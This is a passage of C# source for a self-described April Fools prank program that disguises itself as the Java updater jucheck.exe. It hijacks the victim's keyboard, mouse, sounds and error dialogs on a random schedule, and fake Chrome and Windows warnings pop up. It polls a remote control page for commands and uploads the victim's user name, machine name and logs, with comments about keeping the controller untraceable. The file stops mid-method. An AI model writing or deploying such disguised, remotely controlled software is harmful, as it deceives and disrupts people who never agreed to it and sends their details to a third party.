#define _TESTING

using System;
using System.Collections.Generic;
using System.Linq;
using System.Media;
using System.Threading;
using System.Windows.Forms;
using System.Web;
using Generics;
using System.Reflection;

namespace AprilFools
{
    /*
     * This application will pose as java update application jucheck.exe with app decriptions and icon to match
     * 
     * Hotkeys:
     * CTRL+WIN+F2 Gloabl start
     * CTRL+WIN+F4 Gloabl pause
     * Alt+Shfit+F4 kill application - non reversable without manual restart
     * Alt+Shfit+1 Test Button - only runs in test mode
     * Alt+Shfit+2 Test Button - only runs in test mode
     * 
     * --ideas
     * make noise/tone every hour
     * start odd windows (like ads) - should clear over time or at least limit only 1 persisting to prevent a log in attack
     *  - popup random error mssages for chrome & memmory
	 * Add some narrow wander AI to mouse movement - seperate proc
     * hijack cut, copy paste? or screw with clipboard
     * hide desktop icons - win+d -> cntxt->v->d -> win+d
     * 
     * --done
     * move cursor to random corners or locations
     * Key swapper - swap keys around for a short period and/or clear after being pressed (dynamicly registering key hooks)
     * program wil launch and sit silently 
     * make a accelerating beeping noise perioticly
     * timed random mouse (at times and only for small lengths of time)
	 * 
     */

    public class Pranker
    {
        /// <summary>This is always true untill the application is closing</summary>
        private static bool _applicationRunning = true;
        /// <summary>This enabled or disabled any and all pranking action actions but does not kill the application.</summary>
        private static bool _allPrankingEnabled = true;// will be set false if delayed start
        /// <summary>sleep time for main thread</summary>
        private const int _mainThreadPollingInterval = 50;
        /// <summary>Sleep time for Control read thread. This is how often the control page will get polled</summary>
        private const int _externalControlThreadPollingInterval = 5 * 1000;
        private const int _externalControlThreadPauseAfterFail = 5 * 60 * 1000 - _externalControlThreadPollingInterval;//5 min wait after each failure

        private static bool _externalControlThreadRunning = true;//should always run unless all external control is disabled
        private static bool _soundThreadRunning = true;//should always run unless all sounds are disabled
        private static bool _popupThreadRunning = false;//should always run unless all popups are disabled
        private static bool _eraticMouseRunning = false;
        private static bool _wanderMouseRunning = false;
        private static bool _eraticKeyboardThreadRunning = false;

        private const int TollerableExceptionCount = 3;
        private static int exceptionCount = 0;

        private static CursorWanderAI cursorWanderID = new CursorWanderAI();

        private static bool _playBombBeepingNow = false;
        private static PrankerSound nextSound = PrankerSound.None;
        private static PrankerPopup nextPopup = PrankerPopup.None;

        //Key mapping using assosiative arrays / dictionary
        public static List<Keys> keysToTrack = null;
        public static Dictionary<int, Keys> hotkeyIDs = null;
        public static Dictionary<Keys, string> keyMappings = null;
        /// <summary>Number of Keys to Map. decriement each map untill 0 when key mapping is disabled.</summary>
        public static int keyMapCounter = 0;
        public static bool keyMappingsActive = false;
        public static int KeyMappingMaxDurration = 30 * 60 * 1000;//30 minutes

        /// <summary>Buffer time at the start of the session when nothing will be scheduled. Default is 5 min.</summary>
        const int sessionDefaultStartDelay = 5 * 60 * 1000;
        /// <summary>Length of the session. Default of 8 hours when events will be randomly distributed.</summary>
        const int sessionDefaultDurration = 8 * 60 * 60 * 1000;
        private static EventScheduler<PrankerEvent> schedule;
        private const PrankerSchedule defaultScheduleType = PrankerSchedule.Easy;

        private static Thread externalControlThread;
        private static Thread mouseThread;
        private static Thread eraticKeyboardThread;
        private static Thread soundThread;
        private static Thread popupThread;

        /// <summary>This is the hard coded name of the control page. It is here in the code instead of the cmd line arg so that it cannot be read from the thread and traced back.</summary>
        private const string CTRL_WEB_PAGE_NAME = "prankController.php";
        private const string NEW_CMD_TAG = "_NEW_";
        private const char CMD_SEPERATION_TAG = '\n';
        private const int externalControlPageFailMaxAttempts = 100;
        private static int externalControlPageFailAttempts = 0;
        private static string ctrlWebPage = null;

        private static SplashScreen splashScreen = new SplashScreen();

        /// <summary>
        /// Entry point for prank application
        /// </summary>
        /// <param name="args"></param>
        static void Main(string[] args)
        {
            // Check for command line arguments
            int startDelay = 0;
            PrankerSchedule startSchedule = defaultScheduleType;
            try
            {
                if (args.Length >= 1)
                {
                    startDelay = Convert.ToInt32(args[0]);
                    ctrlWebPage = args[1] + CTRL_WEB_PAGE_NAME;
                    startSchedule = (PrankerSchedule)Convert.ToInt32(args[2]);
                }
            }
            catch (Exception) { }

            InitApplication(startDelay, startSchedule);
        }

        #region Test code
        public static void TestCode1()
        {
            //schedule.AddEvent(PrankerEvent.RunWanderMouse10s, 0);
            //EnableKeyMapping();
            //OpenPopupNow(PrankerPopup.ChromeGPUProcessCrash);
            //schedule.AddEvent(PrankerEvent.PlaySound_Hand3X, 0);

            splashScreen.ShowDialog();
        }

        public static void TestCode2()
        {
            //DisableKeyMapping();
            //OpenPopupNow(PrankerPopup.ChromeResources);
            schedule.AddEvent(PrankerEvent.RunEraticMouse10s, 0);
            schedule.AddEvent(PrankerEvent.PlaySound_Asterisk3X, 0);
        }
        #endregion

        #region Session and schedule setup
        /// <summary>
        /// This funtion will setup which events will occur in the next 12 hours, then call its self to setup the next 12.
        /// </summary>
        /// <param name="scheduleType">The made of this schedule. Chose a preset type or a ran dome type. Default is EasyDay</param>
        /// <param name="sessionDurration">Default durration is 8 hours</param>
        /// <param name="loopSession">Should the session start over/re-generate when the durration is up.</param>
        /// <param name="startDelay">Buffer time at start of session when nothing will be scheduled</param>
        public static void CreateSchedule(PrankerSchedule scheduleType, 
            int sessionDurration = sessionDefaultDurration, //in ms
            bool loopSession = true, 
            int startDelay=sessionDefaultStartDelay)
        {
            List<PrankerEvent> plan = new List<PrankerEvent>(5);
            schedule.ClearSchedule();
            
            switch (scheduleType)
            {
                case PrankerSchedule.SuperEasy:
                    if (_popupThreadRunning) for (int i=1;i<=1;i++) plan.Add(PrankerEvent.CreateRandomPopup);
                    plan.Add(PrankerEvent.RunEraticMouse5s);
                    plan.Add(PrankerEvent.RunWanderMouse5s);
                    plan.Add(PrankerEvent.MapNext5Keys);
                    for (int i=1;i<= 2;i++) plan.Add(PrankerEvent.MoveCursorToRandomCorner);
                    if (loopSession) schedule.AddEvent(PrankerEvent.CreateSchedule_SuperEasy, sessionDurration);
                    break;
                case PrankerSchedule.Easy:
                    if (_popupThreadRunning) for (int i=1;i<=1;i++) plan.Add(PrankerEvent.CreateRandomPopup);
                    plan.Add(PrankerEvent.RunEraticMouse5s);
                    plan.Add(PrankerEvent.RunEraticMouse10s);
                    plan.Add(PrankerEvent.RunWanderMouse5s);
                    plan.Add(PrankerEvent.MapNext5Keys);
                    plan.Add(PrankerEvent.MapNext5Keys);
                    for (int i=1;i<= 4;i++) plan.Add(PrankerEvent.MoveCursorToRandomCorner);
                    if (loopSession) schedule.AddEvent(PrankerEvent.CreateSchedule_Easy, sessionDurration);
                    break;
                default:
                case PrankerSchedule.Medium:
                    if (_popupThreadRunning) for (int i=1;i<=2;i++) plan.Add(PrankerEvent.CreateRandomPopup);
                    plan.Add(PrankerEvent.RunEraticMouse5s);
                    plan.Add(PrankerEvent.RunEraticMouse5s);
                    plan.Add(PrankerEvent.RunEraticMouse10s);
                    plan.Add(PrankerEvent.RunEraticMouse10s);
                    plan.Add(PrankerEvent.RunWanderMouse5s);
                    plan.Add(PrankerEvent.RunWanderMouse5s);
                    plan.Add(PrankerEvent.MapNext5Keys);
                    plan.Add(PrankerEvent.MapNext5Keys);
                    plan.Add(PrankerEvent.MapNext10Keys);
                    for (int i=1;i<=10;i++)plan.Add(PrankerEvent.MoveCursorToRandomCorner);
                    if (loopSession) schedule.AddEvent(PrankerEvent.CreateSchedule_Medium, sessionDurration);
                    break;
                case PrankerSchedule.Medium_SingleKeySwaps:
                    if (_popupThreadRunning) for (int i=1;i<=2;i++) plan.Add(PrankerEvent.CreateRandomPopup);
                    for (int i=1;i<= 2;i++) plan.Add(PrankerEvent.RunEraticMouse5s);
                    for (int i=1;i<= 2;i++) plan.Add(PrankerEvent.RunEraticMouse10s);
                    for (int i=1;i<= 4;i++) plan.Add(PrankerEvent.RunWanderMouse5s);
                    for (int i=1;i<=10;i++) plan.Add(PrankerEvent.MoveCursorToRandomCorner);
                    for (int i=1;i<=20;i++) plan.Add(PrankerEvent.MapNext1Key);
                    if (loopSession) schedule.AddEvent(PrankerEvent.CreateSchedule_Medium_SingleKeySwaps, sessionDurration);
                    break;
                case PrankerSchedule.Medium_DoubleKeySwaps:
                    if (_popupThreadRunning) for (int i=1;i<=2;i++) plan.Add(PrankerEvent.CreateRandomPopup);
                    for (int i=1;i<= 2;i++) plan.Add(PrankerEvent.RunEraticMouse5s);
                    for (int i=1;i<= 2;i++) plan.Add(PrankerEvent.RunEraticMouse10s);
                    for (int i=1;i<= 4;i++) plan.Add(PrankerEvent.RunWanderMouse5s);
                    for (int i=1;i<=10;i++) plan.Add(PrankerEvent.MoveCursorToRandomCorner);
                    for (int i=1;i<=10;i++) plan.Add(PrankerEvent.MapNext1Key);
                    for (int i=1;i<=10;i++) plan.Add(PrankerEvent.MapNext2Keys);
                    if (loopSession) schedule.AddEvent(PrankerEvent.CreateSchedule_Medium_DoubleKeySwaps, sessionDurration);
                    break;
                case PrankerSchedule.Medium_PlusSome://just turned some minor stuff up like move cursor to corner
                    if (_popupThreadRunning) for (int i=1;i<=2;i++) plan.Add(PrankerEvent.CreateRandomPopup);
                    for (int i=1;i<= 5;i++) plan.Add(PrankerEvent.RunEraticMouse5s);
                    for (int i=1;i<= 3;i++) plan.Add(PrankerEvent.RunEraticMouse10s);
                    for (int i=1;i<= 5;i++) plan.Add(PrankerEvent.RunWanderMouse5s);
                    for (int i=1;i<= 2;i++) plan.Add(PrankerEvent.RunWanderMouse10s);
                    for (int i=1;i<=40;i++) plan.Add(PrankerEvent.MoveCursorToRandomCorner);
                    for (int i=1;i<=15;i++) plan.Add(PrankerEvent.MapNext1Key);
                    for (int i=1;i<=10;i++) plan.Add(PrankerEvent.MapNext2Keys);
                    if (loopSession) schedule.AddEvent(PrankerEvent.CreateSchedule_Medium_PlusSome, sessionDurration);
                    break;
                case PrankerSchedule.Hard:
                    /*if (_popupThreadRunning) plan.Add(PrankerEvent.CreateRandomPopup);
                    if (_popupThreadRunning) plan.Add(PrankerEvent.CreateRandomPopup);
                    for (int i=1;i<=2;i++) plan.Add(PrankerEvent.RunEraticMouse5s);
                    for (int i=1;i<=2;i++) plan.Add(PrankerEvent.RunEraticMouse10s);
                    for (int i=1;i<=4;i++) plan.Add(PrankerEvent.RunWanderMouse5s);
                    for (int i=1;i<=10;i++) plan.Add(PrankerEvent.MoveCursorToRandomCorner);
                    for (int i=1;i<=10;i++) plan.Add(PrankerEvent.MapNext1Key);
                    for (int i=1;i<=10;i++) plan.Add(PrankerEvent.MapNext2Keys);*/
                    if (loopSession) schedule.AddEvent(PrankerEvent.CreateSchedule_Medium_SingleKeySwaps, sessionDurration);
                    break;
            }

            //spread plan throughout session randomly
            int eventTimeOffset;
            foreach (PrankerEvent e in plan)
            {
                eventTimeOffset = Generics.GenericsClass.Random.Next(startDelay, sessionDurration);
                schedule.AddEvent(e, eventTimeOffset);
            }
        }

        public enum PrankerSchedule
        {
            SuperEasy=1,
            Easy = 2,
            Medium = 3,
            Medium_SingleKeySwaps = 4,
            Medium_DoubleKeySwaps = 5,
            Medium_PlusSome = 6,
            Hard = 9,
        }
        #endregion

        #region External control
        private static void ExternalControlReadThread()
        {
            GenericsClass.Log("ExternalControlReadThread Started");
            Thread.CurrentThread.Name = "ExternalControlReadThread";
            Thread.CurrentThread.IsBackground = true;
            Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;

            while (_applicationRunning && _externalControlThreadRunning)
            {
                try
                {
                    ReadFromCtrlWebPage();
                    Thread.Sleep(_externalControlThreadPollingInterval);
                }
                catch (Exception e)
                {
                    exceptionCount++;
                    GenericsClass.Log("Exception#" + exceptionCount + " in ExternalControlReadThread() - " + e);
                    if (exceptionCount > TollerableExceptionCount)
                        _applicationRunning = false;
                }
            }
        }

        private static string FetchCtrlPage(bool updateSchedule=false, bool includeTimeStamp=false, bool inludeLogs=true)
        {
            //this is temperarily set to always report logs
            if (ctrlWebPage == null)
                return null;

            string pageUrl = ctrlWebPage;
            string pageUrlData = "";

            if (updateSchedule)
            {
                pageUrlData += "?upload=Y&uploaddata=" + schedule;
                if (includeTimeStamp)
                    pageUrlData += "\n\n as of " + DateTime.Now + " on " + Environment.UserName + "/" + Environment.MachineName + " - (Pranking " + (_allPrankingEnabled ? "Enabled" : "Disabled") + ")";
                if (inludeLogs)
                    pageUrlData += "\n\n " + GenericsClass.GetLogData();
            }
            return GenericsClass.DownloadHTML(pageUrl + pageUrlData, null, true);
        }

        private static void ReadFromCtrlWebPage(bool ignoreExternalCmds=false)
        {
            //GenericsClass.Log("ReadFromCtrlWebPage(" + firstRun + ")");
            string html = FetchCtrlPage();

            if (html != null)
            {
                if (!ignoreExternalCmds)
                {
                    //process html from page by pulling out new cmds
                    string[] newExternalCmds = html.Split(CMD_SEPERATION_TAG);
                    List<PrankerEvent> requestedEvents = new List<PrankerEvent>();
                    foreach (string externalCmdString in newExternalCmds)
                    {
                        if (externalCmdString[0] == '<') continue;
                        if (externalCmdString[0] != '_') break;

                        //new cmd
                        string requestedExternalCmdString = externalCmdString.Replace(NEW_CMD_TAG, "").Trim();
                        bool handled = false;
                        var eventTypes = Enum.GetValues(typeof(PrankerEvent));
                        foreach (PrankerEvent e in eventTypes)
                        {
                            if (e.ToString().Equals(requestedExternalCmdString))
                            {
                                requestedEvents.Add(e);
                                handled = true;
                            }
                        }
                        if (!handled)
                        {
                            GenericsClass.Log("ReadFromCtrlWebPage() - Un-handled new evet from controller \"" + externalCmdString + "\"");
                        }
                    }

                    if (requestedEvents.Count > 0)
                    {
                        //make sure to ignore duplicates and process them in the correct order (like canceling all further cmds or killing the application before further pranking)
                        requestedEvents = requestedEvents.Distinct().ToList();
                        requestedEvents.Sort();
                        foreach (PrankerEvent e in requestedEvents)
                        {
                            if (e == PrankerEvent.CancelAllNewComands) break;

                            GenericsClass.Log("ReadFromCtrlWebPage() Recieved new Cmd - " + DateTime.Now + " - " + e);
                            if (e == PrankerEvent.KillApplication)
                            {
                                _applicationRunning = false;
                                break;
                            }
                            else if (e == PrankerEvent.PausePranking)
                            {
                                _allPrankingEnabled = !_allPrankingEnabled;

                            }
                            else
                            {
                                schedule.AddEvent(e, 0);
                            }
                        }
                    }
                }

                //if schedule changed re-upload current
                //should always do this to keep page timestamp up to date
                html = FetchCtrlPage(true,true);
                if (html != null)
                    externalControlPageFailAttempts = 0; //sucsessfull transactions - read and write
                else //returned null on second page read (write)
                {
                    if (++externalControlPageFailAttempts >= externalControlPageFailMaxAttempts)
                    {
                        _externalControlThreadRunning = false;
                        GenericsClass.Log("ReadFromCtrlWebPage() - External control page write timed out after " + externalControlPageFailAttempts + " attempts. " + GenericsClass.GetLogCount() + " logs ("+GenericsClass.GetLogData().Length+" chars)");
                    }
                    else
                        Thread.Sleep(_externalControlThreadPauseAfterFail);
                }
            }
            else //returned null on first page read
            {
                if (++externalControlPageFailAttempts >= externalControlPageFailMaxAttempts)
                {
                    _externalControlThreadRunning = false;
                    GenericsClass.Log("ReadFromCtrlWebPage() - External control page read timed out after " + externalControlPageFailAttempts + " attempts.");
#if _TESTING
                    //if (MessageBox.Show("Running in testing mode. Press OK to start.","\"The\" App",MessageBoxButtons.OKCancel,MessageBoxIcon.Warning) == DialogResult.Cancel)return;
                    GenericsClass.Beep(BeepPitch.Low, BeepDurration.Long);
                    GenericsClass.Beep(BeepPitch.Low, BeepDurration.Long);
                    GenericsClass.Beep(BeepPitch.Low, BeepDurration.Long);
#endif
                }
                else
                    Thread.Sleep(_externalControlThreadPauseAfterFail);
            }
        }
        #endregion

        #region Key Mapping
        //using assosiative arrays / dictionary
        private static void DefineKeyMappings()
        {
            hotkeyIDs = new Dictionary<int, Keys>();
            keyMappings = new Dictionary<Keys, string>();

            //These keys will be registered as hoykeys
            keysToTrack = new List<Keys>(36);
            #region mapped Key list
            //letters mapped to dvorak
            keysToTrack.Add(Keys.A); keyMappings.Add(Keys.A, "a");
            keysToTrack.Add(Keys.B); keyMappings.Add(Keys.B, "x");
            keysToTrack.Add(Keys.C); keyMappings.Add(Keys.C, "j");
            keysToTrack.Add(Keys.D); keyMappings.Add(Keys.D, "e");
            keysToTrack.Add(Keys.E); keyMappings.Add(Keys.E, ".");
            keysToTrack.Add(Keys.F); keyMappings.Add(Keys.F, "u");
            keysToTrack.Add(Keys.G); keyMappings.Add(Keys.G, "i");
            keysToTrack.Add(Keys.H); keyMappings.Add(Keys.H, "d");
            keysToTrack.Add(Keys.I); keyMappings.Add(Keys.I, "c");
            keysToTrack.Add(Keys.J); keyMappings.Add(Keys.J, "h");
            keysToTrack.Add(Keys.K); keyMappings.Add(Keys.K, "t");
            keysToTrack.Add(Keys.L); keyMappings.Add(Keys.L, "n");
            keysToTrack.Add(Keys.M); keyMappings.Add(Keys.M, "m");
            keysToTrack.Add(Keys.N); keyMappings.Add(Keys.N, "b");
            keysToTrack.Add(Keys.O); keyMappings.Add(Keys.O, "r");
            keysToTrack.Add(Keys.P); keyMappings.Add(Keys.P, "l");
            keysToTrack.Add(Keys.Q); keyMappings.Add(Keys.Q, "'");
            keysToTrack.Add(Keys.R); keyMappings.Add(Keys.R, "p");
            keysToTrack.Add(Keys.S); keyMappings.Add(Keys.S, "o");
            keysToTrack.Add(Keys.T); keyMappings.Add(Keys.T, "y");
            keysToTrack.Add(Keys.U); keyMappings.Add(Keys.U, "g");
            keysToTrack.Add(Keys.V); keyMappings.Add(Keys.V, "k");
            keysToTrack.Add(Keys.W); keyMappings.Add(Keys.W, ",");
            keysToTrack.Add(Keys.X); keyMappings.Add(Keys.X, "q");
            keysToTrack.Add(Keys.Y); keyMappings.Add(Keys.Y, "f");
            keysToTrack.Add(Keys.Z); keyMappings.Add(Keys.Z, ";");
            keysToTrack.Add(Keys.D0); keyMappings.Add(Keys.D0, "-");//shifted 1 over
            keysToTrack.Add(Keys.D1); keyMappings.Add(Keys.D1, "2");
            keysToTrack.Add(Keys.D2); keyMappings.Add(Keys.D2, "3");
            keysToTrack.Add(Keys.D3); keyMappings.Add(Keys.D3, "4");
            keysToTrack.Add(Keys.D4); keyMappings.Add(Keys.D4, "5");
            keysToTrack.Add(Keys.D5); keyMappings.Add(Keys.D5, "6");
            keysToTrack.Add(Keys.D6); keyMappings.Add(Keys.D6, "7");
            keysToTrack.Add(Keys.D7); keyMappings.Add(Keys.D7, "8");
            keysToTrack.Add(Keys.D8); keyMappings.Add(Keys.D8, "9");
            keysToTrack.Add(Keys.D9); keyMappings.Add(Keys.D9, "0");
            #endregion
        }

        public static void RegisterAllKeyMappings()
        {
            if (!keyMappingsActive)
            {
                keyMappingsActive = true;
                DefineKeyMappings();

                int id;
                if (keysToTrack != null)
                {
                    foreach (Keys k in keysToTrack)
                    {
                        id = HotKeyManager.RegisterHotKey(0, k);
                        hotkeyIDs[id] = k;
                    }
                }
            }
        }

        public static void UnregisterAllKeyMappings()
        {
            ; if (hotkeyIDs != null)
            {
                foreach (KeyValuePair<int, Keys> pair in hotkeyIDs)
                {
                    // do something with entry.Value or entry.Key
                    HotKeyManager.UnregisterHotKey(pair.Key);
                }
            }
            hotkeyIDs = null;
            keyMappings = null;
            keyMappingsActive = false;
        }

        public static bool MapKey(HotKeyEventArgs e)
        {
            bool mapped = false;
            
            if(e.Modifiers!=0)
                return mapped;

            Keys pressedKey;
            if (hotkeyIDs.TryGetValue(e.ID, out pressedKey))
            {
                //map this key
                string output = keyMappings[pressedKey];
                //super ugly hack by disabling all mapping just to redo it a line latter but it works - necisarry to prevent call stack loop
                UnregisterAllKeyMappings();
                SendKeys.SendWait(output);
                EnableKeyMapping(--keyMapCounter);
                mapped = true;
            }
            else
            {
                GenericsClass.Log("MapKey(HotKeyEventArgs) - Failed");
            }
            return mapped;
        }

        public static void EnableKeyMapping(int count)
        {
            if (count < 0) count = 0;
            else if (count == 0) { DisableKeyMapping(); return; }

            //enable hotkeys for mapping
            RegisterAllKeyMappings();
            keyMapCounter = count;
        }

        public static void DisableKeyMapping()
        {
            keyMapCounter = 0;
            UnregisterAllKeyMappings();
            GC.Collect();//pretty sure this is doing absolutely nothing
        }
        #endregion

        #region Thread Functions
        /// <summary>
        /// This thread will randomly affect the mouse movements to screw with the end user
        /// </summary>
        public static void MouseThread()
        {
            GenericsClass.Log("MouseThread Started");
            Thread.CurrentThread.Name = "MouseThread";
            Thread.CurrentThread.IsBackground = true;
            Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;

            const int mouseMoveInteral = 16;//less than 60 fps looks weird

            const int moveVariance = 7;
            const int oddsOfMoving = 5;

            cursorWanderID.SetSpeed(0.07f);
            cursorWanderID.SetWanderConfig(25, 0, 35);

            int moveX = 0, moveY = 0;

            while (_applicationRunning)
            {
                try
                {
                    if (_allPrankingEnabled && _wanderMouseRunning)
                    {
                        cursorWanderID.Wander(mouseMoveInteral);
                    }
                    else if (_allPrankingEnabled && _eraticMouseRunning)
                    {
                        // GenericsClass.Log(Cursor.Position.ToString());

                        if (GenericsClass.Random.Next(100) > 100-oddsOfMoving)
                        {
                            // Generate the random amount to move the cursor on X and Y
                            moveX = GenericsClass.Random.Next(2 * moveVariance + 1) - moveVariance;
                            moveY = GenericsClass.Random.Next(2 * moveVariance + 1) - moveVariance;

                            // Change mouse cursor position to new random coordinates
                            Cursor.Position = new System.Drawing.Point(
                                Cursor.Position.X + moveX,
                                Cursor.Position.Y + moveY);
                        }
                    }
                    Thread.Sleep(mouseMoveInteral);
                }
                catch (Exception e)
                {
                    exceptionCount++;
                    GenericsClass.Log("Exception#" + exceptionCount + " in MouseThread() - " + e);
                    if (exceptionCount > TollerableExceptionCount)
                        _applicationRunning = false;
                }
            }
        }

        public static void StartWanderMouse()
        {
            cursorWanderID.SetHeading(GenericsClass.Random.Next(0, 360));
            _wanderMouseRunning = true;
        }

        /// <summary>
        /// This will generate random keyboard output to screw with the end user
        /// </summary>
        public static void EraticKeyboardThread()
        {
            try
            {
                GenericsClass.Log("EraticKeyboardThread Started");
                Thread.CurrentThread.Name = "EraticKeyboardThread";
                Thread.CurrentThread.IsBackground = true;
                Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;

                while (_applicationRunning)
                {
                    try
                    {
                        if (_allPrankingEnabled && _eraticKeyboardThreadRunning)
                        {
                            //if (GenericsClass._random.Next(100) >= 95)
                            {
                                // Generate a random capitol letter
                                char key = (char)(GenericsClass.Random.Next(26) + 65);

                                // 50/50 make it lower case
                                if (GenericsClass.Random.Next(2) == 0)
                                {
                                    key = Char.ToLower(key);
                                }

                                SendKeys.SendWait(key.ToString());
                            }
                        }
                        Thread.Sleep(GenericsClass.Random.Next(300, 2000));
                    }
                    catch (Exception e)
                    {
                        exceptionCount++;
                        GenericsClass.Log("Exception#" + exceptionCount + " in EraticKeyboardThread() - " + e);
                        if (exceptionCount > TollerableExceptionCount)
                            _applicationRunning = false;
                    }
                }
            }
            catch (Exception)
            {
                //generic catch all to not crash the application
            }
        }

        /// <summary>
        /// This will play system sounds at random to screw with the end user
        /// </summary>
        public static void SoundThread()
        {
            GenericsClass.Log("SoundThread Started");
            Thread.CurrentThread.Name = "Sound Thread";
            Thread.CurrentThread.IsBackground = true;
            Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;

            while (_applicationRunning && _soundThreadRunning)
            {
                try
                {
                    if (_allPrankingEnabled && _playBombBeepingNow)
                    {
                        _playBombBeepingNow = false;
                        GenericsClass.PlayBombBeepCountdown();
                    }
                    if (_allPrankingEnabled && nextSound!=PrankerSound.None)
                    {
                        // Randomly select a system sound
                        if(nextSound==PrankerSound.Random)
                        {
                            int rnd = GenericsClass.Random.Next(5);
                            switch (rnd)
                            {
                                case 0:nextSound = PrankerSound.Asterisk;break;
                                case 1:nextSound = PrankerSound.Beep;break;
                                case 2:nextSound = PrankerSound.Exclamation;break;
                                case 3:nextSound = PrankerSound.Hand;break;
                                case 4:nextSound = PrankerSound.Question;break;
                            }
                        }
                        switch(nextSound)
                        {
                            case PrankerSound.Asterisk:
                                SystemSounds.Asterisk.Play(); break;
                            case PrankerSound.Beep:
                                SystemSounds.Beep.Play(); break;
                            case PrankerSound.Exclamation:
                                SystemSounds.Exclamation.Play(); break;
                            case PrankerSound.Hand:
                                SystemSounds.Hand.Play(); break;
                            case PrankerSound.Question:
                                SystemSounds.Question.Play(); break;
                        }
                        nextSound = PrankerSound.None;
                    }
                    try
                    {
                        Thread.Sleep(1000);
                    }
                    catch (ThreadInterruptedException) { }
                }
                catch (Exception e)
                {
                    exceptionCount++;
                    GenericsClass.Log("Exception#" + exceptionCount + " in SoundThread() - " + e);
                    if (exceptionCount > TollerableExceptionCount)
                        _applicationRunning = false;
                }
            }
        }

        public static void PlaySound(PrankerSound sound)
        {
            nextSound = sound;
            soundThread.Interrupt();
        }

        public enum PrankerSound
        {
            None,
            Random,
            Asterisk,
            Beep,
            Exclamation,
            Hand,
            Question,
        }

        /* Designed for playing repeasted sounds but didn't want to deal with converting PrankerSound sound to PrankerEvent */
        public static void RepeatEventAfterPause(PrankerEvent e, int repeatCount, int pause)
        {
            int offset = 0;
            int x = 0;

            while (x < repeatCount)
            {
                schedule.AddEvent(e, offset);
                offset += pause;
                x++;
            }
        }

        /// <summary>
        /// This thread will popup fake error notifications to make the user go crazy and pull their hair out
        /// </summary>
        public static void PopupThread()
        {
            GenericsClass.Log("PopupThread Started");
            Thread.CurrentThread.Name = "PopupThread";
            Thread.CurrentThread.IsBackground = true;
            Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;

            //create weighted popup probabilities for 'random' choice
            Choice popupChoice = new Choice();
            Possibility pos_chromeBadDay = popupChoice.AddPossibility(1, PrankerPopup.ChromeBadDay.ToString());
            Possibility pos_chromeGPUProcessCrashed = popupChoice.AddPossibility(5, PrankerPopup.ChromeGPUProcessCrash.ToString());
            Possibility pos_chromeResources = popupChoice.AddPossibility(20, PrankerPopup.ChromeResources.ToString());
            Possibility pos_windowsResources = popupChoice.AddPossibility(20, PrankerPopup.WindowsResources.ToString());
            //Possibility pos_ie = popup.AddPossibility(20, "IE");
            //Possibility pos_calc = popup.AddPossibility(1, "Calc");

            Possibility rndChoice;
            var popupTypes = Enum.GetValues(typeof(PrankerPopup));
            while (_applicationRunning && _popupThreadRunning)
            {
                try
                {
                    if (_allPrankingEnabled)
                    {
                        if (nextPopup == PrankerPopup.Random)
                        {
                            // Determine which message to show user
                            rndChoice = popupChoice.RandomChoice();
                            
                            foreach (PrankerPopup type in popupTypes)
                            {
                                if (type.ToString().Equals(rndChoice.Name))
                                {
                                    nextPopup = type;
                                    break;
                                }
                            }

                        }

                        switch (nextPopup)
                        {
                            case PrankerPopup.None:
                            case PrankerPopup.Random:
                                break;
                            case PrankerPopup.ChromeGPUProcessCrash:
                                DialogResult result = DialogResult.Retry;
                                    while(result == DialogResult.Retry)
                                        result = MessageBox.Show("Chrome GPU process has crashed.",
                                            "Chrome", MessageBoxButtons.RetryCancel, MessageBoxIcon.Warning);
                                break;
                            case PrankerPopup.ChromeBadDay:
                                MessageBox.Show("Chrome is having a bad day.\nIt is advised you save your work and restart your computer.",
                                    "Chrome", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                break;
                            case PrankerPopup.ChromeResources:
                                MessageBox.Show("Chrome is dangerously low on resources.",
                                    "Chrome", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                break;
                            case PrankerPopup.WindowsResources:
                                MessageBox.Show("Your system is running low on resources",
                                    "Microsoft Windows",MessageBoxButtons.OK,MessageBoxIcon.Warning);
                                break;
                        }
                        nextPopup = PrankerPopup.None;//clear till this is called again
                    }
                    try
                    {
                        Thread.Sleep(1000);
                    }
                    catch (ThreadInterruptedException) { }
                }
                catch (Exception e)
                {
                    exceptionCount++;
                    GenericsClass.Log("Exception#" + exceptionCount + " in SoundThread() - " + e);
                    if (exceptionCount > TollerableExceptionCount)
                        _applicationRunning = false;
                }
            }
        }

        public static void OpenPopupNow(PrankerPopup popup)
        {
            nextPopup = popup;
            popupThread.Interrupt();
        }

        public static void ToggleHiddenDesktopIcons()
        {
            throw new NotImplementedException();
            //stub
            //SendKeys.SendWai
        }

        public enum PrankerPopup
        {//cant do values here because it would break the switch
            None,
            Random,
            ChromeResources,
            ChromeBadDay,
            ChromeGPUProcessCrash,
            WindowsResources,
        }
        #endregion

        #region Core threads and functionality
        private static void InitApplication(int startDelay, PrankerSchedule startSchedule)
        {
            Thread.CurrentThread.Name = "Pranker Main Thread";
            GenericsClass.PrepLogFile(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)+@"\Java\logs\log.txt");
            GenericsClass.Log("April Fools Prank (v" + Assembly.GetExecutingAssembly().GetName().Version + ")");

#if _TESTING
            //if (MessageBox.Show("Running in testing mode. Press OK to start.","\"The\" App",MessageBoxButtons.OKCancel,MessageBoxIcon.Warning) == DialogResult.Cancel)return;
            //GenericsClass.Beep(BeepPitch.Medium, BeepDurration.Long);
            //GenericsClass.Beep(BeepPitch.Medium, BeepDurration.Long);
#endif
            //register hotkey(s)
            GenericsClass.Log("Registering Hotkeys");
            HotKeyManager.HotKeyPressed += new EventHandler<HotKeyEventArgs>(HotKeyPressed);
            HotKeyManager.RegisterHotKey((KeyModifiers.Control | KeyModifiers.Windows), Keys.F2);
            HotKeyManager.RegisterHotKey((KeyModifiers.Control | KeyModifiers.Windows), Keys.F4);
            HotKeyManager.RegisterHotKey((KeyModifiers.Alt | KeyModifiers.Shift), Keys.F4);
#if _TESTING
            HotKeyManager.RegisterHotKey((KeyModifiers.Alt | KeyModifiers.Shift), Keys.D1);
            HotKeyManager.RegisterHotKey((KeyModifiers.Alt | KeyModifiers.Shift), Keys.D2);
#endif

            GenericsClass.Log("Starting Core Threads");
            externalControlThread = new Thread(new ThreadStart(ExternalControlReadThread));
            mouseThread = new Thread(new ThreadStart(MouseThread));
